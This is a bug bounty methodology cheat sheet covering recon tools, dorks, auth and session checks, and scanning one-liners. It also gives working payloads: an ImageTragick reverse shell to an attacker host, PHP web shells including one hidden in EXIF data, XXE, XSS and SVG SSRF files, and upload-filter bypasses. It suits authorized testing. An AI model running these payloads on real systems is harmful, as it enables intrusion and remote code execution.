# Bug Bounty

{% tabs %}
{% tab title="Master Checklist" %}
**Information Gathering**

[LeakIX](https://leakix.net/) - often blocked by organizations for gray hat searches\
[Shodan](https://www.shodan.io/) - scans less frequently than LeakIX but whitelisted\
[Censys](https://search.censys.io/) - best overall scanner but without vulnerability discovery

[Chaos.ProjectDiscovery](https://chaos.projectdiscovery.io/#/) - Real-time Recon/DNS data for Public Bug Bounty Programs\
[ReconFTW](https://github.com/six2dez/reconftw) - automated recon and vulnerability scanner

[Uncover](https://github.com/projectdiscovery/uncover) - tool used to discover exposed hosts on the internet using multiple search engines

[PrettyRecon](https://prettyrecon.com/) - Active Reconnaissance Tool\
[Nuclei](https://github.com/projectdiscovery/nuclei#readme) - Security check scanner that is based on templates; Get started with Nuclei [here](https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei)\
[Nuclei Templates Directory](https://nuclei-templates.netlify.app/) - Visually navigate available nuclei templates\
[Community edition nuclei templates (CENT)](https://github.com/xm1k3/cent) - collect and organize other custom templates

[BountyStrike](https://github.com/BountyStrike/Bountystrike-sh) - collection of bash and python scripts that installs common tools for recon scans and asset discovery

\
Getting started with some CVE scanning using Nuclei templates:

```
nuclei -target "https://site.com" -t cves
```

```
nuclei -target "https://site.com" -t /path/to/nuclei-templates/cves
```

```
nuclei -target "https://site.com" -t cves -rl
```

Mass security testing on subdomains:

```
cat site subdomains.txt | nuclei -t /path/to/nuclei-templates/
```

```
nuclei -t /path/to/nuclei-templates/ -l urls.txt
```

`-rl`, -rate-limit int maximum number of requests to send per second (default 150)&#x20;

`-rlm`, -rate-limit-minute int maximum number of requests to send per minute



Combining nuclei scanner with CENT custom templates

```
nuclei -u https://example.com -t ./cent-nuclei-templates -tags cve
```

```
nuclei -l urls.txt -t ./cent-nuclei-templates -tags cve
```

\
Daily updated Text file of all domains within scope on active Bug Bounty Programs\
[https://github.com/arkadiyt/bounty-targets-data/blob/main/data/domains.txt](https://github.com/arkadiyt/bounty-targets-data/blob/main/data/domains.txt)

| Google Dork                                                                                                                                         | Purpose                                         |
| --------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| `intitle:"index of /.git/"`                                                                                                                         | Searching for Directories                       |
| `allintext:index filetype:git`                                                                                                                      | Search for extensions                           |
| `inurl:"index.php?id="`                                                                                                                             | Searching for PHP pages                         |
| `inurl:"admin/dashboard.php" site:.com`                                                                                                             | Searching for PHP admin dashboards              |
| `Intitle: "login" "admin" site:http://site.com`                                                                                                     | Searching for admin login pages                 |
| `intitle:"Index of /" .htaccess site:http://site.com`                                                                                               | Searching for exposed Apache configuration file |
| `site:website.com inurl:"contact" \| inurl:"contact-us" \| inurl:"contactus" \| inurl:"contcat_us" \| inurl:"contact_form" \| inurl:"contact-form"` | Searching for possible contact form             |

| Shodan Dork                             | Purpose                             |
| --------------------------------------- | ----------------------------------- |
| `hostname:".gov" product:"Jenkins" 200` | Searching Jenkins instances in .gov |

**Sensitive Information Exposure methods Use** [**GitTools**](https://github.com/internetwache/GitTools) **gitdumper.sh**

* [ ] `gitdumper.sh http://IPorURL/.git git`

**Defense Evasion**

Attempt to bypass application protections such as Cloudflare, Akamai, etc.

Worth a shot to use the tool by [Cloudflare Origin IP](https://github.com/gwen001/cloudflare-origin-ip) by @[gwen001](https://github.com/gwen001)

**Authentication:**

Registration

* Input validation
  * [ ] Space manipulation & Using Dots & Case sensivity check
  * [ ] Checking allowed characters (`<> " '`)
  * [ ] Register using `myemail%00@email.com` or (%0d, %0a)
  * [ ] Register using `myemail@target.com`
    * Response manipulate from `401 Unauthorized` to `200 Ok` or `302 Found`
* Analysis
  * [ ] Check `.js` file on the page, such as `login.js`
  * [ ] Check the parameters used on the endpoint
    * Might be listed in the `source` or `js`
  * [ ] Checking the Mobile Endpoint
    * Does it have the same protection as webapp?
    * How does it treat Unicode characters?
  * [ ] Google Dorks
    * `site:example.com inurl:register inurl:&`
    * `site:example.com inurl:signup inurl:&`
    * `site:example.com inurl:join inurl:&`
* Misc
  * [ ] Email Takeover
    * Register an Email, before confirming, change the email. check if the new confirmation email is sent to the first registered email.
* Password reset process
  * Password reset tokens (expiration/reuse)
* Failed retry lockout (DoS)
* Password policies
* Update profile information without asking password
* Default or easy to guess keys
* User enumeration
* HTTP Authentication
* Authentication Bypass
* Identify weak authentication channels (Find primary mechanism and identify secondary mechanicsm / methods \[Mobile App, Call Center, SSO])

**Authorization:**

* [ ] Testing Directory traversal/file inclusion
* [ ] Access to features, functionality or data that should not be available for the current role (privilege escalation, horizontal & vertical, Example: Access admin functionality from a user account without privileges (create, delete, modify users...)
*   [ ] IDORs

    Example: The following URL returns our profile: target.com/profile?idUser=123 Cambiar por target.com/profile?idUser=12**4** Do you have access? Should this profile be accessible to our current user?

**Session:**

* [ ] No cookie validation
* [ ] Not setting a new cookie (session fixation - logout -> Login again)
* [ ] Cookieis easy to reverse engineer (base64/Hash ID)
*   [ ] Are security options set? (secure/HttpOnly)

    HttpOnly not set? is there an XSS? \<script>alert(document.cookie)\</script>
*   [ ] Testing for **C**ross **S**ite **R**equest **F**orgery

    Delete token (parameter y header) Forge your own token Use a second identical CSRF parameter Change POST to GET (or reverse, put, etc)

    Features that should be tested: . Add / Upload file · Change Email · Delete files · Change Password · Transfer money · Edit profile
*   [ ] Logout

    Are you actually logged out? (Session is destroyed)
*   [ ] Session timeout

    Does the session expire after a reasonable amount of time?
*   [ ] JWT

    Signature check Check claims (Especially: **aud** -> "In practical use, this tends to be the "client id" or "client key" of the application that the JWT is intended to be used by."") Signature algorithm Sensitive information in the token How is it revoked? How is it used? How is it processed?

    *   [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

        Brute force, example: ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
    *   [jwt\_tool](https://github.com/ticarpi/jwt\_tool)

        Check various vulns, crack with dictionary Example: python3 jwt\_tool.py
    * [JWT2John](https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py)

    Convert JWT to a format crackable by John python3 [jwt2john.py](http://jwt2john.py/)

    Execute John: ./john /tmp/token.txt —wordlist=wordlist.txt

**General:**

* [ ] Test HTTP Methods
*   [ ] Header Injections

    X-Forwarded-Host: xxxx.com X-Forwarded-For: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Originating-IP: 127.0.0.1
* [ ] Test CORS
*   [ ] S3 AWS

    * [lazys3](https://github.com/nahamsec/lazys3)
    * [AWS Cli](https://aws.amazon.com/es/cli/)

    [http://bucket.s3.amazonaws.com](http://bucket.s3.amazonaws.com/) / [http://s3.amazonaws.com/bucket](http://s3.amazonaws.com/bucket) aws s3 cp test.txt s3://target --no-sign-request aws s3 ls s3://target --no-sign-request

    * [Metadata Cloud](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b)
    * [How the AWS Access Key & Secret works](https://github.com/streaak/keyhacks#AWS-Access-Key-ID-and-Secret)\*\*\*\*

    ***

**File Upload:**

* Extensions Impact
  * `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
  * `SVG`: Stored XSS, SSRF, XXE
  * `GIF`: Stored XSS, SSRF
  * `CSV`: CSV injection
  * `XML`: XXE
  * `AVI`: LFI, SSRF
  * `HTML`, `JS` : HTML injection, XSS, Open redirect
  * `PNG`, `JPEG`: Pixel flood attack (DoS)
  * `ZIP`: RCE via LFI, DoS
  * `PDF`, `PPTX`: SSRF, BLIND XXE
* Blacklisting Bypass
  * PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
  * ASP → `asp`, `.aspx`, `.cer`, `.asa`
  * Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
  * Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
  * Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`
* Whitelisting Bypass
  * `file.jpg.php`
  * `file.php.jpg`
  * `file.php.blah123jpg`
  * `file.php%00.jpg`
  * `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
  * `file.php%00`
  * `file.php%20`
  * `file.php%0d%0a.jpg`
  * `file.php.....`
  * `file.php/`
  * `file.php.\`
  * `file.php#.png`
  * `file.`
  * `.html`
* Vulnerabilities
  * [ ] Directory Traversal
    * Set filename `../../etc/passwd/logo.png`
    * Set filename `../../../logo.png` as it might changed the website logo.
  * [ ] SQL Injection
    * Set filename `'sleep(10).jpg`.
    * Set filename `sleep(10)-- -.jpg`.
  * [ ] Command Injection
    * Set filename `; sleep 10;`
  *   [ ] SSRF

      * Abusing the "Upload from URL", if this image is going to be saved in some public site, you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.
      * SSRF Through `.svg` file.

      ```php
      <?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
      ```
  *   [ ] ImageTragic

      ```
      push graphic-context
      viewbox 0 0 640 480
      fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
      pop graphic-context
      ```
  *   [ ] XXE

      * Upload using `.svg` file

      ```xml
      <?xml version="1.0" standalone="yes"?>
      <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
      <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
         <text font-size="40" x="0" y="16">&xxe;</text>
      </svg>
      ```

      ```xml
      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
          <image xlink:href="expect://ls"></image>
      </svg>
      ```

      * Using excel file
  *   [ ] XSS

      * Set file name `filename="svg onload=alert(document.domain)>"` , `filename="58832_300x300.jpg<svg onload=confirm()>"`
      * Upload using `.gif` file

      ```
      GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
      ```

      * Upload using `.svg` file

      ```xml
      <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
      ```

      ```xml
      <?xml version="1.0" standalone="no"?>
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

      <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
         <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
         <script type="text/javascript">
            alert("HolyBugx XSS");
         </script>
      </svg>
      ```
  *   [ ] Open Redirect

      1. Upload using `.svg` file

      ```xml
      <code>
      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
      <svg
      onload="window.location='https://attacker.com'"
      xmlns="http://www.w3.org/2000/svg">
      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
      </svg>
      </code>
      ```
* Content-ish Bypass
  * [ ] Content-type validation
    * Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
  *   [ ] Content-Length validation

      * Small PHP Shell

      ```php
      (<?=`$_GET[x]`?>)
      ```
  *   [ ] Content Bypass Shell

      * If they check the Content. Add the text "GIF89a;" before you shell-code. ( `Content-type: image/gif` )

      ```php
      GIF89a; <?php system($_GET['cmd']); ?>
      ```
* Misc
  * [ ] Uploading `file.js` & `file.config` (web.config)
  * [ ] Pixel flood attack using image
  * [ ] DoS with a large values name: `1234...99.png`
  * [ ] Zip Slip
    * If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
  *   [ ] Image Shell

      * Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file `mv pic.jpg pic.php.jpg`

      ```php
      exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
      ```



#### **Adobe Experience Manager (AEM) Configuration Testing**

Shodan Dork:

`http.component:"Adobe Experience Manager"`

Resources\
[AEM Hacker Tool](https://github.com/0ang3el/aem-hacker)\
[SlideShare presentation on AEM by 0ang3el](https://www.slideshare.net/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs)

### Reporting

[CVSS 3.1 Calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
{% endtab %}

{% tab title="One-Liners" %}
## Recon

**Dump In-scope Assets from BBPs using repo from** [**@arkadiyt**](https://github.com/arkadiyt/bounty-targets-data)

**HackerOne Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackerone_data.json | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

**BugCrowd Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

**Intigriti Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

**YesWeHack Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

**HackenProof Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

**Federacy Programs**

```bash
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

Dump list of all BBP Domains that are in scope and identify those without dns names (ips.txt)

{% code overflow="wrap" %}
```
curl -sL https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/domains.txt > domains.txt && grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' domains.txt > ips.txt
```
{% endcode %}

**Martian Grip**

from [@notnci](https://gist.github.com/notnci/e65f9d1a167909f1a3f352aded53998b) with beginner explanation

{% code overflow="wrap" %}
```
shodan download testing 'cloud.region:"us-east-1" 200 product:"Elastic" port:8001'; shodan parse --fields ip_str,port testing.json.gz | tee testing_parsed.out | awk '{print$1":"$2}' | httpx -silent -o testing_httpx.out | nuclei -as -silent -o testing_nuclei.out; cat testing_nuclei.out | awk -F " " '{print $6}' | grip | uniq -u | tee testing_vuln_ips.out | nrich - | tee testing_nrich.out
```
{% endcode %}

* The `shodan download` command is attempting to search for devices in the US East (N. Virginia) region that have a product named "Elastic" and are listening on port 8001. The `parse` command is used to extract certain fields (in this case, `ip_str` and `port`) from the results of the search, which are stored in the file `testing.json.gz`.
* `httpx` is a tool that can be used to perform HTTP requests and analyze the response. In this case, the command is using the `-silent` flag to suppress output and the `-o` flag to write the response to a file called `testing_httpx.out`. The input for this command appears to be the list of IP addresses and ports extracted from the Shodan search results.
* \`\`[`nuclei`](https://github.com/projectdiscovery/nuclei) is a tool for detecting vulnerabilities and misconfigurations in web applications. The `-as` flag stands for "active scan", which means that the tool will perform various types of requests to the target web application in order to identify potential vulnerabilities. The `-silent` flag suppresses output, and the `-o` flag specifies an output file for the results. The input for this command is the list of IP addresses and ports extracted from the Shodan search results.
* `awk` is a tool for processing text files. The command appears to be extracting the sixth field (`$6`) from the output of the `nuclei` command, which is piped (`|`) to the `grip` command.
* `grip` is a command line tool for rendering local readme files before sending them to GitHub. In this case, it is used to render the output of the `awk` command, which is then passed to `uniq` with the `-u` flag to remove duplicate lines. The resulting list of unique lines is written to the file `testing_vuln_ips.out`.
* [`nrich`](https://gitlab.com/shodan-public/nrich) is a tool for performing OSINT (Open Source Intelligence) on IP addresses. The input for this command appears to be the list of IP addresses and ports extracted from the Shodan search results, and the `-` flag tells the tool to read the input from standard input (stdin). The results are written to the file `testing_nrich.out`.

**Find SQLi at scale**

`# collect target urls`\
``\ `subfinder -d site.com -silent - all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls`\``\
`# filter potential SQLi Url`\
`cat urls | gf sqli | tee -a sqli`\
\`\`\
`# run test`\
`while read line; do sqlmap -u $line --parse-errors --curent-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < sqli`

**Local File Inclusion**

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

**Open-redirect**

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

**XSS**

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

**Find JavaScript Files**

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```

**Extract Endpoints from JavaScript**

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

**Get CIDR & Org Information from Target Lists**

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

## **Finding Subdomains**

**Get Subdomains from RapidDNS.io**

```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```

**Get Subdomains from BufferOver.run**

```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

```bash
export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"
```

**Get Subdomains from Riddler.io**

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

**Get Subdomains from VirusTotal**

```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

**Get Subdomain with cyberxplore**

```
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```

**Get Subdomains from CertSpotter**

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

**Get Subdomains from Archive**

```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

**Get Subdomains from JLDC**

```bash
curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

**Get Subdomains from securitytrails**

```bash
curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u
```

**Bruteforcing Subdomain using DNS Over**

```
while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt
```

**Get Subdomains With sonar.omnisint.io**

```
curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

**Get Subdomains With synapsint.com**

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u 
```

**Get Subdomains from crt.sh**

```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

**Sort & Tested Domains from Recon.dev**

```bash
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```

**Discover subdomains and enumerate API endpoints discovered with subfinder**

```
subfinder -d host.com -silent -all | httpx -silent -o host.txt; for i in $(cat host_httpx.txt); do DOMAIN=$(echo $i | unfurl format %d); ffuf -u $i/FUZZ -w common-api-endpoints.txt -o ${DOMAIN]_ffuf.txt; done
```

**Subdomain Bruteforcer with FFUF**

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```

**Find Allocated IP Ranges for ASN from IP Address**

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

**Extract IPs from a File**

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

**CVE 2022-1040 (Give your domain without http/https on the "sophos\_servers" file)**

```
cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}" | grep -q 'Session Expired' && printf "$host \033[1;41mVulnerable [ Sophos RCE ]\e[0m\n"; done;
```

## General

**Use grep 𝐭𝐨 𝗘𝘅𝘁𝗿𝗮𝗰𝘁 𝗨𝗥𝗟'𝘀 𝗳𝗿𝗼𝗺 𝗷𝘂𝗻𝗸 𝗱𝗮𝘁𝗮**

* From a local file

```
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

* From an online resource

```
curl http://site.xxx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```
{% endtab %}

{% tab title="Interesting Web Paths" %}
**Git**

/.git

/.gitkeep

/.git-rewrite

/.gitreview

/.git/HEAD

/.gitconfig

/.git/index

/.git/logs

/.svnignore

/.gitattributes

/.gitmodules

/.svn/entries
{% endtab %}
{% endtabs %}

